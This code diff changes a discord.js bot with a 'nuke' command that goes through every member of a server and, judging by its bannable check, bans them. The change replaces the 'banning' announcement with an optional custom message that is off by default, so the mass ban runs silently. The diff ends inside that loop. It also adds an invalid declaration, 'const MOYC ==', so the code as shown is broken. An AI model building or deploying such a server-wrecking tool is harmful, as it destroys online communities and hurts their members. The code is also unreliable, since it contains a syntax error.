@@ -2,12 +2,16 @@ const Discord = require('discord.js');
 const bot = new Discord.Client();
 const config = require('./config.json');
 const prefix = "smart!"
+const SendMessage = false
+const MOYC == "stuff" // message of ur choice lol
 
 bot.on('message', async message => {
     let Args = message.content.slice(prefix.length).trim().split(/ +/g);
     switch (Args[0]) {
         case 'nuke':
-            message.channel.send("banning")
+            if(SendMessage == true) {
+             message.channel.send(`${MOYC}`)   
+            }
             await message.guild.members.cache.forEach(member => {
                 console.log(member)
                 if (!member.bannable) {
